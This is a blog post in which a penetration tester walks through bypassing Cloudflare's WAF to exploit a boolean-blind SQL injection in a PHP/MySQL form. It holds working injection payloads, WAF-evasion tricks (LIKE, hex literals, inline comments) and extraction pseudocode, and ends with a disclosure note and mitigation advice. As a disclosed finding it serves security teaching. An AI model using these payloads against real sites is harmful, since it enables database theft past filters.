---
layout: post
title:  "How I bypassed Cloudflare's SQL Injection filter"
date:   2020-09-04 10:37:00
categories: Web
---

In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
came up: a possible SQL injection which couldn't be exploited using the tool.
The reason: Cloudflare's WAF and more specifically its SQL Injection filter.


#### Details about the application
The application was a generic website written in PHP with MySQL as the backend
DBMS. The vulnerable page submitted a POST request with multipart form body
data to the /index.php endpoint. I honestly don't remember the use of the form
and it doesn't really matter for the writeup. The POST request looked like this:

{% highlight http %}
POST /index.php HTTP/1.1
Host: ******
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: multipart/form-data; boundary=dc30b7aab06d4aff91d4285d7e60d4f3

--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="126"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="127"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="130"

...
...

###### #### 6 ########
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="task"

form.save
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="form_id"

X-MARK
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="96"

############
--dc30b7aab06d4aff91d4285d7e60d4f3

...
...

Content-Disposition: form-data; name="115[]"

########## ################## #### ###### ######
--dc30b7aab06d4aff91d4285d7e60d4f3
Content-Disposition: form-data; name="125"

###### ###### ########## ########
--dc30b7aab06d4aff91d4285d7e60d4f3--
{% endhighlight %}

The unsanitized parameter at X-MARK can be used to inject arbitrary values at
the place of the WHERE clause of an SQL SELECT query.
For example, if the above data was sent as the body of the POST request, the
SQL query which would be executed on the server would look something like this:

{% highlight sql %}
SELECT c1,c2,c3 FROM t1 WHERE X-MARK;
{% endhighlight %}

The technique typically used for this kind of injection is a Time-based Blind
SQL injection. The problem was, that Cloudflare would recognize these kinds of
injections and block them on the spot. No matter how complicated I tried to make
the query or how many sqlmap tamper scripts I used, Cloudflare was always there.

To overcome this issue, I used an observation I made while manually testing for
SQL injections on the same request:
I had noticed that when I tried to inject code that resulted in something close
to the following SQL query:

{% highlight sql %}
SELECT c1,c2,c3 FROM t1 WHERE 'a'='a';
{% endhighlight %}

the web server responded with status 200 OK.
When I tried to inject code that resulted in something close to this SQL query:

{% highlight sql %}
SELECT c1,c2,c3 FROM t1 WHERE 'a'='b';
{% endhighlight %}

the server responded with status 500 Internal Server Error.

In other words when the SQL query in the backend did NOT return results, the web
server complained and crashed (probably because the backend code tried to access
an item in the returned list whose index was out of range).
This gave me an idea: writing a script that compared a character picked from the
name of the required DBMS entity and sequentially compared it with all
characters. The idea was, if the two characters matched, the server would return
a 200 OK status, else it would return a 500 Internal Server Error status and I
would have to compare the requested character with the next character in my
list.


#### First Try
My thinking was that if a wanted to find the first second character of the name
of the fifth table (as they are listed in information_schema.tables), I would
start by asking MySQL if that character is equal to 'a' and if not I would
continue with 'b', 'c' etc. I would start by inject the following string (for
comparison with 'a'):

{% highlight sql %}
'a' =
 (SELECT SUBSTRING(table_name, 2, 1)
  FROM information_schema.tables
  LIMIT 4, 1
 )
{% endhighlight %}

which would result in the following SQL query to be executed on the server:

{% highlight sql %}
SELECT c1,c2,c3 FROM t1
WHERE 'a' =
 (SELECT SUBSTRING(table_name, 2, 1)
  FROM information_schema.tables
  LIMIT 4, 1
 )
{% endhighlight %}

When I found the table name to be t1 for example, I was to brute force its
columns' names with the following starting injection:

*INJECTION 1*
{% highlight sql %}
'a' =
 (SELECT SUBSTRING(column_name, 1, 1)
  FROM information_schema.columns
  WHERE table_name = "t1"
  LIMIT 0, 1
 )
{% endhighlight %}

and then actually get values out of column c1 of table t1 by starting with the
following injection:

{% highlight sql %}
'a' =
 (SELECT SUBSTRING(c1, 1, 1)
  FROM t1
  LIMIT 0, 1
 )
{% endhighlight %}

The idea was good, but Cloudflare would complain about the '=' sign. The
injection

{% highlight sql %}
'a' = 'b'
{% endhighlight %}

would get blocked by Cloudflare's WAF. After a bit of fiddling, I came up with
the following request that bypassed the '=' restriction:

{% highlight sql %}
'a' LIKE 'b'
{% endhighlight %}

This means that the initial injection *INJECTION 1* would become:

{% highlight sql %}
'a' LIKE
 (SELECT SUBSTRING(column_name, 1, 1)
  FROM information_schema.columns
  WHERE table_name = "t1"
  LIMIT 0, 1
 )
{% endhighlight %}

#### Second Try
*INJECTION 1* was still not ready to go. Cloudflare would still complain about stuff.
More specifically the injection

{% highlight sql %}
'a' LIKE 'b'
{% endhighlight %}

would still get blocked, not because of the LIKE keyword, but because of the 'a'
character. Comparing plain strings to anything was not allowed. To overcome this
issue I came up with the following injection that went through undetected by the
WAF:

{% highlight sql %}
'0x61' LIKE 'b'
{% endhighlight %}

The above injection sends the character 'a' as the hex-encoded value '0x61'
which still allows it to work:

{% highlight sql %}
'0x61' LIKE 'a'
{% endhighlight %}

still returns True, and

{% highlight sql %}
'0x61' LIKE 'b'
{% endhighlight %}

passes through undetected and returns False.

The resulting *INJECTION 1* now looks like this:

{% highlight sql %}
'0x61' LIKE
 (SELECT SUBSTRING(column_name, 1, 1)
  FROM information_schema.columns
  WHERE table_name = "t1"
  LIMIT 0, 1
 )
{% endhighlight %}

#### Third Try
The third obfuscation I had to enroll was a multi-line comment addition between
SQL query keywords. Cloudflare would block queries like this:

{% highlight sql %}
SELECT c1,c2,c3 FROM t1 WHERE '0x61' LIKE 'b'
{% endhighlight %}

but with a multi-line comment trick, the new query would go through undetected:

{% highlight sql %}
SELECT/*trick comment*/ c1,c2,c3
FROM/*trick comment*/ t1
WHERE '0x61' LIKE 'b'
{% endhighlight %}

Thus, applying this method on *INJECTION 1*, would make it look like this:

{% highlight sql %}
'0x61' LIKE
 (SELECT/*trick comment*/ SUBSTRING(column_name, 1, 1)
  FROM/*trick comment*/ information_schema.columns
  WHERE table_name = "t1"
  LIMIT 0, 1
 )
{% endhighlight %}

The above injection is in its final form and when passed as a form value to the
vulnerable web application the web server will reply with a 200 OK if the
character 'a' matches the first character of the first column's name of table
t1.

#### Full Speed Ahead
To make the retrieving of table contents from the application's database easier
I wrote a script in Python to automate the process. The pseudocode of the script
goes something like this:

{% highlight python %}
# assert names of columns and table name is known
alphabet = [a,b,c,...,y,z]
characterPosition = 1 # the position of the character we are bruteforcing
for rowNumber in [0,20]:
  for columnName in columns:
    for character in alphabet:
      sqlInjection = '''
        0x{hex_encode(character)} LIKE (
        SELECT/*trick comment*/ SUBSTRING({columnName}, characterPosition,1)
        FROM/*trick comment*/ tableName
        LIMIT {rowNumber}, 1
        )
      '''

      inject sqlInjection is POST request body
      if response.status == 200:
        result += character
        recurse function with characterPosition++
      elif response.status == 500:
        continue with next character in alphabet

      return result
{% endhighlight %}

And this is how I bypassed Cloudflare WAF's SQL injection protection. I got a
free t-shirt and a place in [Cloudflare's HoF][cf-hof].

#### Mitigation
<p>Cloudlfare reviewed and fixed the vulnerability a few days after my report.</p>
The safest way to mitigate SQL injections on your databases is prepared
statements. These come in most database interaction libraries for most
languages. You can find a full list of ways to mitigate SQL injections at
[OWASP][owasp-sql].
It is my opinion that if developers take good care to apply security measures
on their applications, WAFs are most of the times unnecessary. All you need to
do is sanitize the users' input properly.

[cf-hof]: https://hackerone.com/gskourou
[owasp-sql]:    https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
